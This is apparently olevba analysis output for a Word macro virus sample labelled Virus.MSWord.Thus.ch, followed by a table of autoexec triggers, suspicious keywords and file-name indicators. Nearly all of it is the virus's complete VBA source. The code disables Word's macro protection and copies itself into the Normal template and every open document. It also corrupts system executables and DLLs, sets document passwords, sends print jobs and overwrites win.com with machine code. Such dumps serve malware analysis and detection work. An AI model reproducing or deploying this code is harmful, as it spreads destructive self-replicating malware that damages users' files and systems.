olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.ch
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.ch - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Karachi_y2k7'
'rel1.2'
Document_Open
End Sub

Private Sub Document_New()
'Karachi_y2k7'
'rel1.2'
Document_Open
End Sub

Private Sub Document_Open()
'Karachi_y2k7'
'rel1.2'
    Dim ox%, oy%, ix&, iy%, a%
    Dim i As Long, n As Long
    Dim k As Integer, s$, chk0$, chk1$
    On Error GoTo Karachi_become_essential
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Karachi_y2k7'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'rel1.2'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Karachi_y2k7'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'rel1.2'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
    Open "c:\windows\system\ie3dvu.dll" For Binary As 1
    Get #1, 1, k
    k = k + 1
    Put #1, 1, k
    Close 1
    If k < 25 Then GoTo trimmer
    k = 0
    Open "c:\windows\system\ie3dvu.dll" For Binary As 1
    Put #1, 1, k
    Close 1
    If Day(Now()) Mod 5 = 0 Then Application.ActiveDocument.WritePassword = Application.System.Creator
    s$ = "C:\WINDOWS\SOL.EXE": GoSub Chronicle
    s$ = "C:\WINDOWS\MSHEARTS.EXE": GoSub Chronicle
    s$ = "C:\WINDOWS\FREECELL.EXE": GoSub Chronicle
    If Day(Now()) Mod 3 = 0 Then
        s$ = "C:\WINDOWS\ROUTE.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\PING.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\NETOS.DLL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\NETDI.DLL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\NETBIOS.DLL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\NETAPI.DLL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\NETAPI32.DLL": GoSub Chronicle
        If Day(Now()) Mod 6 = 0 Then
            s$ = "C:\WINDOWS\SYSTEM\NETCPL.CPL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\INETCPL.CPL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\MODEM.CPL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\URL.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\SENDMAIL.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\MAPI32.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\INETCOMM.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\INETCFG.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\INETAB32.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\INET16.DLL": GoSub Chronicle
            If Day(Now()) Mod 9 = 0 Then
                s$ = "C:\WINDOWS\SYSTEM\LPT.VXD": GoSub Chronicle
                s$ = "C:\WINDOWS\SYSTEM\SPOOL32.EXE": GoSub Chronicle
                s$ = "C:\WINDOWS\SYSTEM\MSPRINT.DLL": GoSub Chronicle
                s$ = "C:\WINDOWS\SYSTEM\MSPRINT2.DLL": GoSub Chronicle
            End If
        End If
    End If
    If Day(Now()) Mod 2 = 0 Then
        Application.ActiveDocument.PrintOut , , , , , , , Fix(Rnd * 9) + 1
        If Day(Now()) Mod 4 = 0 Then
            chk0$ = "Karachi_y2k7"
            chk1$ = "????????????"
            Open "c:\windows\win.com" For Binary As 1
            i = LOF(1) - 11
            Get #1, i, chk1$
            Close 1
            If Not chk1$ = chk0$ Then
                Open "c:\windows\win.com" For Binary As 1
                i = LOF(1)
                ox% = 0: oy% = 0
                Get #1, 1, ox%
                Get #1, 3, oy%
                n = i + &H100
                n = n - &H103
                ix& = (n And &HFF) * 256 + &HE9
                iy% = &HE00 + n \ 256
                Put #1, 1, ix&
                Put #1, 3, iy%
                Seek #1, i + 1
                a% = &HFFB9: Put #1, , a%
                a% = &H5100: Put #1, , a%
                a% = &HC889: Put #1, , a%
                a% = &H70BA: Put #1, , a%
                a% = &HEF00: Put #1, , a%
                a% = &HC889: Put #1, , a%
                a% = &H71BA: Put #1, , a%
                a% = &HEF00: Put #1, , a%
                a% = &H9059: Put #1, , a%
                a% = &HEFE2: Put #1, , a%
                a% = &H9090: Put #1, , a%
                iy% = &HE990
                Put #1, , iy%
                Close 1
                Open "c:\windows\win.com" For Binary As 1
                i = LOF(1) + 1
                ix& = ((oy% And &HFF)) * 256 + (ox% \ 256)
                ix& = ix& + &H100 + 3
                ix& = (ix& - 3) - (i + &H100 - 2)
                ix& = ix& And &HFFFF
                Seek #1, i
                Put #1, , ix&
                Put #1, , chk0$
                Close 1
            End If
            If Day(Now()) Mod 6 = 0 Then
                Name "c:\windows\win.com" As "win.org"
                Open "c:\windows\win.com" For Binary As 1
                a% = &HA6BB: Put #1, , a%
                a% = &HB901: Put #1, , a%
                a% = &H7F: Put #1, , a%
                a% = &HC031: Put #1, , a%
                a% = &H78A: Put #1, , a%
                a% = &H8950: Put #1, , a%
                a% = &HBAC8: Put #1, , a%
                a% = &H70: Put #1, , a%
                a% = &H42EF: Put #1, , a%
                a% = &HEF58: Put #1, , a%
                a% = &H8950: Put #1, , a%
                a% = &H5C8: Put #1, , a%
                a% = &H80: Put #1, , a%
                a% = &HEF4A: Put #1, , a%
                a% = &H4258: Put #1, , a%
                a% = &H4BEF: Put #1, , a%
                a% = &HE4E2: Put #1, , a%
                a% = &H1B8: Put #1, , a%
                a% = &HCD4C: Put #1, , a%
                a% = &H121: Put #1, , a%
                a% = &H5101: Put #1, , a%
                a% = &H3: Put #1, , a%
                a% = &H205: Put #1, , a%
                a% = &H810: Put #1, , a%
                a% = &H2609: Put #1, , a%
                a% = &H5002: Put #1, , a%
                a% = &H80: Put #1, , a%
                a% = &H4000: Put #1, , a%
                a% = &HF000: Put #1, , a%
                a% = &H305: Put #1, , a%
                a% = &H280: Put #1, , a%
                a% = &H3C00: Put #1, , a%
                a% = &H7F: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H27: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H6D00: Put #1, , a%
                a% = &H1D: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H300: Put #1, , a%
                a% = &H26: Put #1, , a%
                a% = &H323C: Put #1, , a%
                a% = &H1: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H1500: Put #1, , a%
                a% = &H1904: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H8700: Put #1, , a%
                a% = &H2E00: Put #1, , a%
                a% = &H1213: Put #1, , a%
                a% = &H141E: Put #1, , a%
                a% = &H12: Put #1, , a%
                a% = &H97: Put #1, , a%
                a% = &H5A02: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H1: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                a% = &H0: Put #1, , a%
                Close 1
            End If
        End If
    End If
trimmer:
    Exit Sub
Chronicle:
Open s$ For Binary Shared As 1
i = LOF(1) - 11
chk0$ = "????????????"
Get #1, i, chk0$
Close 1
If Not chk0$ = "Karachi_y2k7" Then
        Open s$ For Binary Shared As 1
        For i = 4 To 1020
                k = 0
                Get #1, i, k
                k = (k And &HFF00) Or (255 - (k And &HFF))
                Put #1, i, k
        Next
        Close 1
        Open s$ For Binary Shared As 1
        i = LOF(1) + 1
        Seek #1, i
        chk0$ = "Karachi_y2k7"
        Put #1, i, chk0$
        Close 1
End If
Return
Karachi_become_essential:
Resume Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ie3dvu.dll          |Executable file name                         |
|IOC       |SOL.EXE             |Executable file name                         |
|IOC       |MSHEARTS.EXE        |Executable file name                         |
|IOC       |FREECELL.EXE        |Executable file name                         |
|IOC       |ROUTE.EXE           |Executable file name                         |
|IOC       |PING.EXE            |Executable file name                         |
|IOC       |NETOS.DLL           |Executable file name                         |
|IOC       |NETDI.DLL           |Executable file name                         |
|IOC       |NETBIOS.DLL         |Executable file name                         |
|IOC       |NETAPI.DLL          |Executable file name                         |
|IOC       |NETAPI32.DLL        |Executable file name                         |
|IOC       |NETCPL.CPL          |Executable file name                         |
|IOC       |INETCPL.CPL         |Executable file name                         |
|IOC       |MODEM.CPL           |Executable file name                         |
|IOC       |URL.DLL             |Executable file name                         |
|IOC       |SENDMAIL.DLL        |Executable file name                         |
|IOC       |MAPI32.DLL          |Executable file name                         |
|IOC       |INETCOMM.DLL        |Executable file name                         |
|IOC       |INETCFG.DLL         |Executable file name                         |
|IOC       |INETAB32.DLL        |Executable file name                         |
|IOC       |INET16.DLL          |Executable file name                         |
|IOC       |SPOOL32.EXE         |Executable file name                         |
|IOC       |MSPRINT.DLL         |Executable file name                         |
|IOC       |MSPRINT2.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

